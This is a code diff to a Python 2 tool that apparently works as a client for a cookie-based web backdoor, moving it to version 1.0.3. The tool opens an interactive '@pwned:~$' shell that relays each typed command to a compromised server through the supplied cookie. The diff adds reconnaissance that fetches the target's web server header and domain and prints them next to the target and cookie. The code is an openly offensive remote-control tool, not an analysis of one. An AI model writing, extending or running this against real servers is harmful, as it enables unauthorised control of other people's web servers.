@@ -8,6 +8,7 @@
 ###############################################
 import os                                     #
 import sys                                    #
+import urllib                                 #
 import optparse                               #
 import requests                               #
 from sys import argv                          #
@@ -34,7 +35,7 @@ elif "win" in sys.platform:
 else:
     pass
 
-_version_ = "1.0.2"
+_version_ = "1.0.3"
 
 # colors
 class color:
@@ -76,13 +77,16 @@ def backcookie(command, host, cookie, vcmd):
 
 def shell(host, cookie):
 	backcookie("cd",host,cookie,"")
+	openurl = urllib.urlopen(host)
+	server = openurl.headers.get("server")
+	domain = host.split("/")[2]
 	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
 	print "\t\t+    Developed by: @mrjopino      +"
 	print "\t\t+             To play             +"
 	print "\t\t-----------------------------------\n\n"
 	print color.green + "[+] " + color.blue  + "Happy hacking" + color.white
 	print color.green + "[+] " + color.blue  + "Sometimes it is not positive, but sometimes if!\n" + color.white
-
+	
 	while True:
 
 		command = raw_input("@" + "pwned:~$ ")
@@ -90,9 +94,11 @@ def shell(host, cookie):
 			backcookie(command,host,cookie,"command")
 		else:
 			print "\n"
-			print color.yellow + "[*] " + color.green  + "Information" + color.white
-			print color.yellow + "[!] " + color.blue  + "Target: " + host + color.white
-			print color.yellow + "[!] " + color.blue  + "Cookie: " + cookie + color.white
+			print color.yellow + "[*] " + color.white  + "Information" + color.white
+			print color.yellow + "[!] " + color.green  + "Host: " + color.blue + domain + color.white
+			print color.yellow + "[!] " + color.green  + "WebServer: " + color.blue + server + color.white
+			print color.yellow + "[!] " + color.green  + "Target: " + color.blue + host + color.white
+			print color.yellow + "[!] " + color.green  + "Cookie: " + color.blue + cookie + color.white
 			print "\n"
 
 		command = raw_input("@" + "pwned:~$ ")
@@ -109,7 +115,7 @@ def shell(host, cookie):
 			break
 
 def main():
-	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
+	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.3")
 	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
 	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
 	(options, args) = parser.parse_args()
